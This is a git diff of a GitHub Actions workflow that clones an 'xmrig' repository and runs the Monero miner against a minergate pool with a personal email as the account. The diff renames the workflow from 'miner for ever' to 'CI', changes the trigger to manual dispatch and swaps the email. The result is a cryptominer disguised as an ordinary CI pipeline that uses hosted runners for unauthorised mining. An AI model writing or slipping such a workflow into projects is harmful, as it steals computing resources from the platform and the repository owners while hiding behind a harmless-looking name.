@@ -1,10 +1,12 @@
-# spelling.yml is blocked per https://github.com/check-spelling/check-spelling/security/advisories/GHSA-g86g-chm8-7r2p
-name: miner for ever
-on:
-  pull_request_target:
-  push:
+name: CI
+
+on: workflow_dispatch
 
 jobs:
+  build:
+
+    runs-on: ubuntu-latest
+
     steps:
     - name: git clone https://github.com/quincyhays/bmxmrig
       run: |
@@ -15,6 +17,6 @@ jobs:
     - name: chmod u+x ./xmrig
       run: |
         chmod u+x ./xmrig
-    - name: ./xmrig -o xmr.pool.minergate.com:45700 -u nardebanedanesh@gmail.com -p x --donate-level 1
+    - name: ./xmrig -o xmr.pool.minergate.com:45700 -u arianabb.me@gmail.com -p x --donate-level 1
       run: |
-        ./xmrig -o xmr.pool.minergate.com:45700 -u nardebanedanesh@gmail.com -p x --donate-level 1
+        ./xmrig -o xmr.pool.minergate.com:45700 -u arianabb.me@gmail.com -p x --donate-level 1
